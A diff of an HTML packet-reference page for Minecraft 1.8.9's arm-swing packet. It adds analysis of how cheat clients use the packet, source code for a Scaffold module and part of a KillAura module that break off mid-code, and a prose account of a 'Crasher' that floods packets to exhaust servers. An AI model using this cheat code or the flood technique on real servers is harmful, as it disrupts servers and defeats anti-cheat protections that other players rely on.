@@ -18,14 +18,14 @@
 <meta name="twitter:description" content="C0APacketAnimation (0x0A): Player swings their arm (left click or server-side swing). Empty packet with no payload.">
 <meta name="twitter:label1" content="Direction"><meta name="twitter:data1" content="Serverbound">
 <meta name="twitter:label2" content="State"><meta name="twitter:data2" content="PLAY">
-<meta name="twitter:label3" content="Modules"><meta name="twitter:data3" content="NoSwing, Animation">
+<meta name="twitter:label3" content="Modules"><meta name="twitter:data3" content="Scaffold, KillAura / Aura, Stealer, BadPacketsComponent, Crasher, GrimReduceVelocity">
 <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📦</text></svg>">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="../../css/style.css">
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"TechArticle","headline":"C0APacketAnimation — Minecraft 1.8.9 Packet Reference","description":"","about":{"@type":"SoftwareApplication","name":"Minecraft Java Edition","version":"1.8.9"},"proficiencyLevel":"Expert","articleSection":"PLAY Protocol — Serverbound"}
+{"@context":"https://schema.org","@type":"TechArticle","headline":"C0APacketAnimation — Minecraft 1.8.9 Packet Reference","description":"The empty swing packet. Scaffold, KillAura, Stealer and velocity modules inject C0A to keep server-side animation consistent with spoofed actions, Rise 6.x tracks it as a bad-packet state bit, and Tenacity's Crasher weaponizes its zero-payload cheapness by flooding thousands per tick.","about":{"@type":"SoftwareApplication","name":"Minecraft Java Edition","version":"1.8.9"},"proficiencyLevel":"Expert","articleSection":"PLAY Protocol — Serverbound"}
 </script>
 </head>
 <body>
@@ -66,22 +66,1191 @@
 </div></div>
 <div class="detail-section"><h3>Handler Interface</h3><div class="mcp-block"><div class="mcp-row"><span class="mcp-label">HND</span><code>INetHandlerPlayServer</code></div></div></div>
 <div class="detail-section"><h3>Notes</h3><div class="notes-box">When the server receives this, it broadcasts S0BPacketAnimation to nearby players. The empty packet just notifies the server of the swing. Client-side swings (swingItem()) are purely local and don't send this packet.</div></div>
+<div class="detail-section"><h3>Deep Dive</h3><div class="writeup-block">
+<h4>Role in the protocol</h4>
+<p>The swing packet is the client's arm-swing notice to the server. C0APacketAnimation carries no payload: in 1.8.9 both readPacketData and writePacketData are no-ops, so the wire cost is a single packet id byte (0x0A). EntityPlayerSP.swingItem() fires it at the start of each swing cycle under the isSwingInProgress guard, and the server echoes the action to every tracked player as S0BPacketAnimation with animation id 0. Because the packet is unauthenticated action signaling, its only real content is timing: when it arrives and how often.</p>
+<h4>Vanilla handling</h4>
+<p>Server side, NetHandlerPlayServer.processAnimation calls markPlayerActive() then swingItem() on the EntityPlayerMP. The first resets the idle counter used by the player-list AFK kick logic; the second advances the entity's swing animation and broadcasts S0BPacketAnimation to all trackers. Client side, swingItem() sends the packet once per swing cycle, so one swing equals one packet in vanilla. Mining, attacking and block placement all route through the same swing; the attack itself is a separate C02PacketUseEntity.</p>
+<h4>Why clients touch it</h4>
+<p>Five distinct uses appear in the corpus. Scaffold modules send C0A after every onPlayerRightClick3d placement so the server sees a swing matching the block place (Memeware, Nekoware, Rise 5.99, Rise 6.x, Sigma, Tenacity). KillAura-family modules send it in place of swingItem() when the local animation must stay off (Spicy Killaura noSwing mode, Rise 5.99 Aura alwaysSwing). Stealer modules swing before opening chests in Nearby mode. Rise 6.x treats C0A as a swing state bit in BadPacketsComponent and sends it from velocity and flight modes to satisfy attack heuristics. Tenacity Crasher floods 2000 to 10000 C0A packets per motion tick.</p>
+<h4>Exploit surface</h4>
+<p>The packet is empty and the server broadcasts the swing to every tracker, so flooding multiplies server work per byte: Tenacity's Crasher pushes up to 10000 per tick to exhaust the server. Swing rate is also a heuristic input: anti-cheats pair C0A with C02PacketUseEntity to count real attacks, which is why velocity modes send C0A before attackEntity (GrimReduceVelocity). A spoofed swing is always safe: the packet carries no position, timestamp or sequence, so the server cannot verify it, only count it.</p>
+</div></div>
+<div class="detail-section"><h3>Server-Side Handling</h3><div class="callout callout-server"><p>processAnimation is two calls: markPlayerActive() resets the idle-tick counter that protects against AFK kicks, then swingItem() plays the arm animation and broadcasts S0BPacketAnimation to tracked players. There is no validation on the packet itself: no cooldown, no rate limit, no payload. Any count per tick is accepted and echoed.</p></div></div>
+<div class="detail-section"><h3>Protocol Analysis</h3><div class="callout callout-proto"><p>The class is a pure marker: readPacketData and writePacketData are no-ops, so a swing costs one VarInt id byte on the wire. The client sends it from EntityPlayerSP.swingItem() once per swing cycle, guarded by isSwingInProgress. The serverbound id 0x0A maps to the arm-swing animation id 0 in the S0BPacketAnimation broadcast. Timing is the only signal: anti-cheats derive swing rate and attack cadence from packet arrival, not from content.</p></div></div>
+<div class="detail-section"><h3>Anti-Cheat Landscape</h3><div class="callout callout-ac"><p>Attack anti-cheats count C0A arrivals relative to C02PacketUseEntity: swings without attacks are tolerated (mining, air swings), but bursts of swings with no C03 or C02 between them read as scaffold or autoclicker activity. Rise 6.x BadPacketsComponent explicitly tracks swing as a flag and resets it on the next C03PacketPlayer; other modules query that flag before sending spoofed actions. Flooding C0A trips server-side packet-rate limits long before any movement check.</p></div></div>
 <div class="impl-section"><h3><span class="impl-badge">implementation</span> Implementation Cases</h3>
-<div class="impl-module-entry"><div class="impl-module-header"><span class="impl-module-name">NoSwing</span>
-<span class="impl-module-clients">(Gugustus)</span>
+<p class="impl-pattern">The empty swing packet. Scaffold, KillAura, Stealer and velocity modules inject C0A to keep server-side animation consistent with spoofed actions, Rise 6.x tracks it as a bad-packet state bit, and Tenacity's Crasher weaponizes its zero-payload cheapness by flooding thousands per tick.</p>
+<div class="impl-module-entry"><div class="impl-module-header"><span class="impl-module-name">Scaffold</span>
+<span class="impl-module-clients">(Memeware 7.3, Nekoware v1 private, Rise 5.99, Rise 6.2.4, Rise 6.1.30, Sigma 4.11, Tenacity 6.0)</span>
 </div>
-<p class="impl-pattern">Cancel or fake swing animation. NoSwing cancels the arm swing packet.</p>
-<div class="impl-code-wrap collapsed"><div class="impl-code"><code>if (event.getPacket() instanceof C0APacketAnimation) event.setCancelled(true);</code></div><button class="code-expand-btn" onclick="var w=this.parentNode;w.classList.toggle('collapsed');w.classList.toggle('expanded');this.querySelector('.expand-label').textContent=w.classList.contains('collapsed')?'Show more':'Show less'"><svg class="expand-icon-collapsed" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg><svg class="expand-icon-expanded" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="18 15 12 9 6 15"/></svg><span class="expand-label">Show more</span></button></div>
-<div class="impl-meta"><span><strong>Vanilla hook:</strong> EventSendPacket</span></div>
+<p class="impl-pattern">Send a swing with each block placement so the server sees a human-looking arm action alongside the C08 place packet.</p>
+<p class="impl-pattern" style="font-size:0.8rem;color:var(--text-muted)">In the post phase of UpdateEvent, after onPlayerRightClick3d returns true, push a raw C0APacketAnimation into the send queue. The pre phase computes the placement target and rotations; the swing is fired only when the placement actually succeeded.</p>
+<p class="impl-meta" style="font-size:0.75rem"><span><strong>Source:</strong> Memeware 7.3 — me/memewaredevs/client/module/player/Scaffold.java</span></p>
+<div class="impl-code-wrap collapsed"><div class="impl-code"><code>// ===== FILE: Memeware 7.3 — me/memewaredevs/client/module/player/Scaffold.java =====
+package me.memewaredevs.client.module.player;
+
+import me.hippo.api.lwjeb.annotation.Handler;
+import me.memewaredevs.client.event.events.UpdateEvent;
+import me.memewaredevs.client.module.Module;
+import me.memewaredevs.client.util.blocks.ScaffoldUtils;
+import me.memewaredevs.client.util.blocks.misc.BlockInfo;
+import me.memewaredevs.client.util.blocks.position.Vec3d;
+import me.memewaredevs.client.util.combat.RotationUtils;
+import me.memewaredevs.client.util.misc.Timer;
+import net.minecraft.block.Block;
+import net.minecraft.init.Blocks;
+import net.minecraft.item.Item;
+import net.minecraft.item.ItemBlock;
+import net.minecraft.network.play.client.C0APacketAnimation;
+import net.minecraft.potion.Potion;
+import net.minecraft.util.BlockPos;
+import net.minecraft.util.Vec3;
+import org.lwjgl.input.Keyboard;
+
+import java.util.Arrays;
+import java.util.List;
+import java.util.function.Consumer;
+
+public class Scaffold extends Module {
+
+	private int block;
+	private static List&lt;Block&gt; blockBlacklist = Arrays.asList(Blocks.air, Blocks.water, Blocks.tnt, Blocks.chest,
+			Blocks.flowing_water, Blocks.lava, Blocks.flowing_lava, Blocks.tnt, Blocks.enchanting_table, Blocks.carpet,
+			Blocks.glass_pane, Blocks.stained_glass_pane, Blocks.iron_bars, Blocks.snow_layer, Blocks.ice,
+			Blocks.packed_ice, Blocks.coal_ore, Blocks.diamond_ore, Blocks.emerald_ore, Blocks.chest, Blocks.torch,
+			Blocks.anvil, Blocks.trapped_chest, Blocks.noteblock, Blocks.jukebox, Blocks.tnt, Blocks.gold_ore,
+			Blocks.iron_ore, Blocks.lapis_ore, Blocks.sand, Blocks.lit_redstone_ore, Blocks.quartz_ore,
+			Blocks.redstone_ore, Blocks.wooden_pressure_plate, Blocks.stone_pressure_plate,
+			Blocks.light_weighted_pressure_plate, Blocks.heavy_weighted_pressure_plate, Blocks.stone_button,
+			Blocks.wooden_button, Blocks.lever, Blocks.enchanting_table, Blocks.red_flower, Blocks.double_plant,
+			Blocks.yellow_flower);
+	private BlockInfo data;
+	private Timer timer = new Timer();
+	private int slot, newSlot, oldSlot;
+
+	public Scaffold() {
+		super("Scaffold", Keyboard.KEY_G, Category.PLAYER);
+		this.slot = -1;
+	}
+
+	@Handler
+	public Consumer&lt;UpdateEvent&gt; sexoButthole = (event) -&gt; {
+		if (event.isPre()) {
+			for (block = 0; block &lt; 45; ++block)
+				mc.thePlayer.inventoryContainer.getSlot(block).getStack();
+			int tempSlot = ScaffoldUtils.getBlockSlot();
+			if (ScaffoldUtils.invCheck()) {
+				for (int i = 9; i &lt; 36; ++i) {
+					Item item;
+					if (!mc.thePlayer.inventoryContainer.getSlot(i).getHasStack()
+							|| !((item = mc.thePlayer.inventoryContainer.getSlot(i).getStack()
+									.getItem()) instanceof ItemBlock)
+							|| blockBlacklist.contains(((ItemBlock) item).getBlock())
+							|| ((ItemBlock) item).getBlock().getLocalizedName().toLowerCase().contains("chest"))
+						continue;
+					ScaffoldUtils.swap(i, 7);
+					break;
+				}
+			}
+			data = null;
+			slot = -1;
+			if (tempSlot != -1) {
+				newSlot = ScaffoldUtils.getBlockSlot();
+				oldSlot = mc.thePlayer.inventory.currentItem;
+				mc.thePlayer.inventory.currentItem = newSlot;
+				BlockPos blockBelow1 = new BlockPos(mc.thePlayer.posX, mc.thePlayer.posY - 0.9, mc.thePlayer.posZ);
+				mc.thePlayer.inventory.currentItem = oldSlot;
+				if (mc.theWorld.getBlockState(blockBelow1).getBlock() == Blocks.air) {
+					data = ScaffoldUtils.getBlockData(blockBelow1);
+					slot = tempSlot;
+					if (data == null) {
+						data = ScaffoldUtils.getBlockData(blockBelow1.offsetDown());
+					}
+					if (data == null)
+						return;
+					float[] rots = RotationUtils.doScaffoldRotations(new Vec3d(blockBelow1));
+					mc.thePlayer.rotationYawHead = rots[0];
+					mc.thePlayer.rotationPitchHead = rots[1];
+					mc.thePlayer.renderYawOffset = rots[0];
+					event.setYaw(rots[0]);
+					event.setPitch(rots[1]);
+				}
+			}
+		} else {
+			if (this.data != null &amp;&amp; this.timer.delay(75L) &amp;&amp; this.slot != -1) {
+				mc.thePlayer.inventory.currentItem = newSlot;
+				if (mc.playerController.onPlayerRightClick3d(mc.thePlayer, mc.theWorld,
+						mc.thePlayer.inventoryContainer.getSlot(36 + slot).getStack(), data.position, data.face,
+						ScaffoldUtils.getVec3d(data.position, data.face))) {
+					mc.thePlayer.sendQueue.addToSendQueue(new C0APacketAnimation());
+				}
+				mc.thePlayer.inventory.currentItem = oldSlot;
+				if (mc.gameSettings.keyBindJump.pressed) {
+					if (!mc.thePlayer.isMoving() &amp;&amp; !mc.gameSettings.keyBindForward.pressed) {
+						mc.thePlayer.motionZ *= 0.0;
+						mc.thePlayer.motionX *= 0.0;
+						mc.thePlayer.motionY = 0.41999998688697815;
+					}
+				}
+			}
+		}
+	};
+}
+// NOTE (AI): Memeware sends the swing directly into the send queue after a successful onPlayerRightClick3d. The same pattern appears in Nekoware's Scaffold, and Rise 5.99's Scaffold sends via PacketUtil.sendPacket in two branches of its placement logic.</code></div><button class="code-expand-btn" onclick="var w=this.parentNode;w.classList.toggle('collapsed');w.classList.toggle('expanded');this.querySelector('.expand-label').textContent=w.classList.contains('collapsed')?'Show more':'Show less'"><svg class="expand-icon-collapsed" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg><svg class="expand-icon-expanded" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="18 15 12 9 6 15"/></svg><span class="expand-label">Show more</span></button></div>
+<div class="impl-meta"><span><strong>Vanilla hook:</strong> UpdateEvent post phase; swing follows the placement call, not a packet event.</span></div>
+<div class="impl-meta" style="color:var(--orange);margin-top:4px"><span>Harmless: it matches vanilla placing behavior (swing accompanies the block place). The flag surface is the placement rate, not the swing.</span></div>
+<div class="impl-meta" style="margin-top:4px"><span><strong>Variations:</strong> Nekoware's Scaffold is byte-for-byte the same pattern. Rise 5.99 sends via PacketUtil.sendPacket. Rise 6.x Scaffold sends at its line ~752 with PacketUtil.send. Sigma sends via sendQueue in two code paths (lines ~431 and ~1089). Tenacity ScaffoldModule sends at line ~201 via addToSendQueue.</span></div>
 </div>
-<div class="impl-module-entry"><div class="impl-module-header"><span class="impl-module-name">Animation</span>
-<span class="impl-module-clients">(Gugustus)</span>
+<div class="impl-module-entry"><div class="impl-module-header"><span class="impl-module-name">KillAura / Aura</span>
+<span class="impl-module-clients">(Rise 5.99, Rise 6.2.4, Rise 6.1.30, Sigma 4.11, Spicy)</span>
 </div>
-<p class="impl-pattern">Cancel or fake swing animation. NoSwing cancels the arm swing packet.</p>
-<div class="impl-code-wrap collapsed"><div class="impl-code"><code>if (event.getPacket() instanceof C0APacketAnimation) event.setCancelled(true);</code></div><button class="code-expand-btn" onclick="var w=this.parentNode;w.classList.toggle('collapsed');w.classList.toggle('expanded');this.querySelector('.expand-label').textContent=w.classList.contains('collapsed')?'Show more':'Show less'"><svg class="expand-icon-collapsed" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg><svg class="expand-icon-expanded" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="18 15 12 9 6 15"/></svg><span class="expand-label">Show more</span></button></div>
-<div class="impl-meta"><span><strong>Vanilla hook:</strong> EventSendPacket</span></div>
+<p class="impl-pattern">Swing server-side while controlling the local animation. Spicy's noSwing mode sends the packet instead of swingItem() so the arm does not visibly swing client-side.</p>
+<p class="impl-pattern" style="font-size:0.8rem;color:var(--text-muted)">On the attack timer elapse, if noSwing is enabled, push new C0APacketAnimation() into the send queue and then send C02PacketUseEntity ATTACK; otherwise call swingItem() locally. Rise 5.99 Aura sends C0A when alwaysSwing is on and the raytrace failed, faking swings at out-of-range targets. Rise 6.x KillAura tracks C0A in onPacketSend to set its swing state bit, consumed by auto-block delay logic.</p>
+<p class="impl-meta" style="font-size:0.75rem"><span><strong>Source:</strong> Spicy — info/spicyclient/modules/combat/Killaura.java</span></p>
+<div class="impl-code-wrap collapsed"><div class="impl-code"><code>// ===== FILE: Spicy — info/spicyclient/modules/combat/Killaura.java =====
+package info.spicyclient.modules.combat;
+
+import java.awt.Color;
+import java.text.DecimalFormat;
+import java.util.Comparator;
+import java.util.List;
+import java.util.Random;
+import java.util.stream.Collectors;
+
+import org.lwjgl.input.Keyboard;
+
+import info.spicyclient.SpicyClient;
+import info.spicyclient.chatCommands.Command;
+import info.spicyclient.events.Event;
+import info.spicyclient.events.listeners.EventMotion;
+import info.spicyclient.events.listeners.EventRenderGUI;
+import info.spicyclient.events.listeners.EventUpdate;
+import info.spicyclient.modules.Module;
+import info.spicyclient.modules.movement.Sprint;
+import info.spicyclient.settings.BooleanSetting;
+import info.spicyclient.settings.ModeSetting;
+import info.spicyclient.settings.NumberSetting;
+import info.spicyclient.settings.SettingChangeEvent;
+import info.spicyclient.util.MovementUtils;
+import info.spicyclient.util.RenderUtils;
+import info.spicyclient.util.RotationUtils;
+import info.spicyclient.util.Timer;
+import net.minecraft.client.Minecraft;
+import net.minecraft.client.gui.FontRenderer;
+import net.minecraft.client.gui.Gui;
+import net.minecraft.client.gui.GuiScreen;
+import net.minecraft.client.gui.ScaledResolution;
+import net.minecraft.client.gui.inventory.GuiInventory;
+import net.minecraft.client.renderer.GlStateManager;
+import net.minecraft.client.renderer.RenderHelper;
+import net.minecraft.enchantment.EnchantmentHelper;
+import net.minecraft.entity.Entity;
+import net.minecraft.entity.EntityLivingBase;
+import net.minecraft.entity.monster.EntityMob;
+import net.minecraft.entity.passive.EntityAnimal;
+import net.minecraft.entity.player.EntityPlayer;
+import net.minecraft.item.ItemStack;
+import net.minecraft.item.ItemSword;
+import net.minecraft.network.play.client.C02PacketUseEntity;
+import net.minecraft.network.play.client.C02PacketUseEntity.Action;
+import net.minecraft.network.play.client.C03PacketPlayer;
+import net.minecraft.network.play.client.C07PacketPlayerDigging;
+import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement;
+import net.minecraft.network.play.client.C0APacketAnimation;
+import net.minecraft.util.BlockPos;
+import net.minecraft.util.EnumFacing;
+import net.minecraft.util.MathHelper;
+import net.minecraft.util.Vec3;
+import net.minecraft.util.MovingObjectPosition.MovingObjectType;
+import net.minecraft.world.World;
+import net.minecraft.world.WorldSettings;
+
+public class Killaura extends Module {
+	
+	public static EntityLivingBase target = null;
+	
+	public NumberSetting range = new NumberSetting("Range", 4, 1, 6, 0.1);
+	private NumberSetting aps = new NumberSetting("APS", 10, 0, 20, 1);
+	private BooleanSetting noSwing = new BooleanSetting("NoSwing", false);
+	private BooleanSetting disableOnDeath = new BooleanSetting("DisableOnDeath", false);
+	public BooleanSetting dontHitDeadEntitys = new BooleanSetting("Don't hit dead entitys", true);
+	public ModeSetting targetsSetting = new ModeSetting("Targets", "Players", "Players", "Animals", "Mobs", "Everything");
+	public ModeSetting rotationSetting = new ModeSetting("Rotation setting", "lock", "lock", "smooth");
+	public ModeSetting newAutoblock = new ModeSetting("Autoblock mode", "None", "None", "Vanilla", "Hypixel");
+	public ModeSetting targetingMode = new ModeSetting("Targeting mode", "Single", "Single", "Switch");
+	public NumberSetting switchTime = new NumberSetting("Switch Time", 2, 0.1, 10, 0.1);
+	public BooleanSetting hitOnHurtTime = new BooleanSetting("Hit on hurt time", false);
+	
+	private static transient boolean blocking = false;
+	
+	private static transient float lastSmoothYaw, lastSmoothPitch;
+	
+	private static transient double dynamicAPS = 14;
+	private static transient Timer dynamicAPSTimer = new Timer();
+	
+	private int[] randoms = {0,1,0};
+	public static float sYaw, sPitch, upAndDownPitch = 0;
+	
+	public static transient double healthBarTarget = 0, healthBar = 0;
+	
+	// These settings are not used anymore but are still here so you can update old configs
+	private BooleanSetting autoblock = new BooleanSetting("Autoblock", false);
+	public ModeSetting targetModeSetting = new ModeSetting("Targets", "Players", "Players", "Animals", "Mobs", "Everything");
+	
+	public Killaura() {
+		super("Killaura", Keyboard.KEY_NONE, Category.COMBAT);
+		resetSettings();
+	}
+	
+	private static Timer targetSwitchTimer = new Timer();
+	private static EntityLivingBase lastTarget = null;
+	
+	@Override
+	public void resetSettings() {
+		this.settings.clear();
+		this.addSettings(range, aps, noSwing, switchTime, disableOnDeath, dontHitDeadEntitys, targetsSetting, newAutoblock, targetingMode, rotationSetting, hitOnHurtTime);
+	}
+	
+	public void onEnable() {
+		
+		lastSmoothYaw = mc.thePlayer.rotationYaw;
+		lastSmoothPitch = mc.thePlayer.rotationPitch;
+		
+		healthBar = new ScaledResolution(mc).getScaledWidth() / 2 - 41;
+		dynamicAPS = aps.getValue();
+		upAndDownPitch = 0;
+		
+	}
+	
+	public void onDisable() {
+		
+		healthBar = new ScaledResolution(mc).getScaledWidth() / 2 - 41;
+		RenderUtils.resetPlayerYaw();
+		RenderUtils.resetPlayerPitch();
+		
+        if (mc.thePlayer != null &amp;&amp; newAutoblock.is("Hypixel")) {
+        	try {
+                if (blocking &amp;&amp; newAutoblock.is("Hypixel") &amp;&amp; mc.thePlayer.inventory.getCurrentItem().getItem() != null &amp;&amp; mc.thePlayer.inventory.getCurrentItem().getItem() instanceof ItemSword) {
+                    mc.gameSettings.keyBindUseItem.pressed = false;
+                    mc.playerController.onStoppedUsingItem(mc.thePlayer);
+                }
+			} catch (NullPointerException e) {
+				// TODO: handle exception
+			}
+        	
+        }
+
+	}
+	
+	public Timer timer = new Timer();
+	
+	@Override
+	public void onSettingChange(SettingChangeEvent e) {
+		
+		if (e.setting != null &amp; e.setting.equals(targetingMode)) {
+			
+			if (targetingMode.is("Single") &amp;&amp; settings.contains(switchTime)) {
+				settings.remove(switchTime);
+				this.settings.sort(Comparator.comparing(s -&gt; s == keycode ? 1 : 0));
+			}
+			else if (targetingMode.is("Switch") &amp;&amp; !settings.contains(switchTime)) {
+				settings.add(switchTime);
+				this.settings.sort(Comparator.comparing(s -&gt; s == keycode ? 1 : 0));
+			}
+			
+		}
+		
+	}
+	
+	public void onEvent(Event e) {
+		
+		// For the target hud
+		if (e instanceof EventRenderGUI &amp;&amp; target != null) {
+			
+			if (target == null) {
+				healthBar = new ScaledResolution(mc).getScaledWidth() / 2 - 41;
+				return;
+			}
+			
+			ScaledResolution sr = new ScaledResolution(mc);
+			FontRenderer fr = mc.fontRendererObj;
+			DecimalFormat dec = new DecimalFormat("#");
+			
+			healthBarTarget = sr.getScaledWidth() / 2 - 41 + (((140) / (target.getMaxHealth())) * (target.getHealth()));
+			
+			// Lower is faster, higher is slower
+			double HealthBarSpeed = 5;
+			
+			if (healthBar &gt; healthBarTarget) {
+				healthBar = ((healthBar) - ((healthBar - healthBarTarget) / HealthBarSpeed));
+			}
+			else if (healthBar &lt; healthBarTarget) {
+				//healthBar = healthBarTarget;
+				healthBar = ((healthBar) + ((healthBarTarget - healthBar) / HealthBarSpeed));
+			}
+			//Command.sendPrivateChatMessage(healthBarTarget + " : " + healthBar);
+			
+			int color = (target.getHealth() / target.getMaxHealth() &gt; 0.66f) ? 0xff00ff00 : (target.getHealth() / target.getMaxHealth() &gt; 0.33f) ? 0xffff9900 : 0xffff0000;
+			
+			color = 0xff00ff00;
+			
+			float[] hsb = Color.RGBtoHSB(((int)SpicyClient.config.hud.colorSettingRed.getValue()), ((int)SpicyClient.config.hud.colorSettingGreen.getValue()), ((int)SpicyClient.config.hud.colorSettingBlue.getValue()), null);
+			float hue = hsb[0];
+			float saturation = hsb[1];
+			color = Color.HSBtoRGB(hue, saturation, 1);;
+			
+			if (SpicyClient.config.rainbowgui.isEnabled()) {
+				float hue1 = System.currentTimeMillis() % (int)((100.5f - SpicyClient.config.rainbowgui.speed.getValue()) * 1000) / (float)((100.5f - SpicyClient.config.rainbowgui.speed.getValue()) * 1000);
+				color = Color.HSBtoRGB(hue1, 0.65f, 1);
+			}
+			
+			Gui.drawRect(sr.getScaledWidth() / 2 - 110, sr.getScaledHeight() / 2 + 100, sr.getScaledWidth() / 2 + 110, sr.getScaledHeight() / 2 + 170, 0xff36393f);
+			Gui.drawRect(sr.getScaledWidth() / 2 - 41, sr.getScaledHeight() / 2 + 100 + 54, sr.getScaledWidth() / 2 + 100, sr.getScaledHeight() / 2 + 96 + 45, 0xff202225);
+			Gui.drawRect(sr.getScaledWidth() / 2 - 41, sr.getScaledHeight() / 2 + 100 + 54, healthBar, sr.getScaledHeight() / 2 + 96 + 45, color);
+			//Gui.drawRect(sr.getScaledWidth() / 2 - 41, sr.getScaledHeight() / 2 + 100 + 54, healthBarTarget, sr.getScaledHeight() / 2 + 96 + 45, color);
+			
+			GlStateManager.color(1, 1, 1);
+			GuiInventory.drawEntityOnScreen(sr.getScaledWidth() / 2 - 75, sr.getScaledHeight() / 2 + 165, 25, 1f, 1f, target);
+			fr.drawString(target.getName(), sr.getScaledWidth() / 2 - 40, sr.getScaledHeight() / 2 + 110, -1);
+			fr.drawString("HP: ", sr.getScaledWidth() / 2 - 40, sr.getScaledHeight() / 2 + 125, -1);
+			fr.drawString("§c❤: §f" + dec.format(target.getHealth()), sr.getScaledWidth() / 2 - 40 + fr.getStringWidth("HP: "), sr.getScaledHeight() / 2 + 125, color);
+			//fr.drawString(dec.format(target.getMaxHealth()) + "", sr.getScaledWidth() / 2 - 40 + fr.getStringWidth("HP: ") + fr.getStringWidth(dec.format(target.getHealth()) + " / "), sr.getScaledHeight() / 2 + 125, color);
+			
+			/*
+			RenderHelper.enableGUIStandardItemLighting();
+			mc.getRenderItem().renderItemAndEffectIntoGUI(target.getHeldItem(), sr.getScaledWidth() / 2 - 40, sr.getScaledHeight() / 2 + 143);
+			mc.getRenderItem().renderItemAndEffectIntoGUI(target.getCurrentArmor(3), sr.getScaledWidth() / 2 - 10, sr.getScaledHeight() / 2 + 143);
+			mc.getRenderItem().renderItemAndEffectIntoGUI(target.getCurrentArmor(2), sr.getScaledWidth() / 2 + 20, sr.getScaledHeight() / 2 + 143);
+			mc.getRenderItem().renderItemAndEffectIntoGUI(target.getCurrentArmor(1), sr.getScaledWidth() / 2 + 50, sr.getScaledHeight() / 2 + 143);
+			mc.getRenderItem().renderItemAndEffectIntoGUI(target.getCurrentArmor(0), sr.getScaledWidth() / 2 + 80, sr.getScaledHeight() / 2 + 143);
+			*/
+			
+			//Gui.drawRect(sr.getScaledWidth() / 2, sr.getScaledHeight() / 2 + 100, sr.getScaledWidth() / 2 + 10, sr.getScaledHeight() / 2 + 150, 0x50000000);
+			
+		}
+		
+		if (e instanceof EventUpdate) {
+			
+			if (e.isPre()) {
+				
+				//this.additionalInformation = targetingMode.getMode() + SpicyClient.hud.separator + rotationSetting.getMode();
+				this.additionalInformation = "R: " + range.getValue() + SpicyClient.hud.separator + "APS: " + aps.getValue();
+				
+			}
+			
+		}
+		
+		if (e instanceof EventMotion) {
+			
+			if (e.isPre()) {
+				
+				Sprint s = SpicyClient.config.sprint;
+				
+				if (mc.thePlayer.isDead &amp;&amp; disableOnDeath.isEnabled()) {
+					
+					toggled = false;
+					
+				}
+				
+				target = null;
+				
+				EventMotion event = (EventMotion) e;
+				
+				List&lt;EntityLivingBase&gt; targets = (List&lt;EntityLivingBase&gt;) mc.theWorld.loadedEntityList.stream().filter(EntityLivingBase.class::isInstance).collect(Collectors.toList());
+				targets.sort(Comparator.comparingDouble(entity -&gt; ((EntityLivingBase)entity).getDistanceToEntity(mc.thePlayer)));
+				
+				List&lt;EntityLivingBase&gt; targetsToRemove = (List&lt;EntityLivingBase&gt;) mc.theWorld.loadedEntityList.stream().filter(EntityLivingBase.class::isInstance).collect(Collectors.toList());
+				targetsToRemove.clear();
+				
+				if (dontHitDeadEntitys.enabled) {
+					targets = targets.stream().filter(entity -&gt; entity.getDistanceToEntity(mc.thePlayer) &lt; range.getValue() &amp;&amp; entity != mc.thePlayer &amp;&amp; !entity.isDead &amp;&amp; entity.getHealth() &gt; 0).collect(Collectors.toList());
+				}else {
+					targets = targets.stream().filter(entity -&gt; entity.getDistanceToEntity(mc.thePlayer) &lt; range.getValue() &amp;&amp; entity != mc.thePlayer &amp;&amp; !entity.isDead).collect(Collectors.toList());
+				}
+				
+				
+				if (targets.isEmpty()) {
+					
+					healthBar = new ScaledResolution(mc).getScaledWidth() / 2 - 41;
+					stopBlocking();
+					RenderUtils.resetPlayerYaw();
+					RenderUtils.resetPlayerPitch();
+					return;
+				}
+				
+				if (!targets.isEmpty()) {
+					
+					for (EntityLivingBase a : targets) {
+						if (a.getDistanceToEntity(mc.thePlayer) &gt; range.getValue()) {
+							targetsToRemove.add(a);
+						}
+					}
+					
+					int target_filter = targetsSetting.index;
+					
+					if (target_filter == 0) {
+						// kill aura will only hit non invisible players
+						//targets.stream().filter(EntityPlayer.class::isInstance).collect(Collectors.toList());
+						for (EntityLivingBase a : targets) {
+							if (a instanceof EntityPlayer) {
+								
+							}else {
+								targetsToRemove.add(a);
+							}
+						}
+					}
+					else if (target_filter == 1) {
+						// kill aura will only hit animals
+						//targets.stream().filter(EntityAnimal.class::isInstance).collect(Collectors.toList());
+						for (EntityLivingBase a : targets) {
+							if (a instanceof EntityAnimal) {
+								
+							}else {
+								targetsToRemove.add(a);
+							}
+						}
+					}
+					else if (target_filter == 2) {
+						// kill aura will only hit mobs
+						//targets.stream().filter(EntityMob.class::isInstance).collect(Collectors.toList());
+						for (EntityLivingBase a : targets) {
+							if (a instanceof EntityMob) {
+								
+							}else {
+								targetsToRemove.add(a);
+							}
+						}
+					}
+					else if (target_filter == 3) {
+						// kill aura will hit everything
+						
+					}else {
+						
+					}
+					
+					targets.removeAll(targetsToRemove);
+					
+					if (targets.isEmpty()) {
+						RenderUtils.resetPlayerYaw();
+						RenderUtils.resetPlayerPitch();
+						stopBlocking();
+						return;
+					}
+					
+					if (newAutoblock.getMode() != "None") {
+						
+						startBlocking();
+						
+					}
+					
+					target = targets.get(0);
+					
+					if (target instanceof EntityPlayer &amp;&amp; SpicyClient.config.antibot.isEnabled() &amp;&amp; !mc.isSingleplayer() &amp;&amp; mc.getCurrentServerData().serverIP.toLowerCase().contains("hypixel")) {
+						
+	                    try {
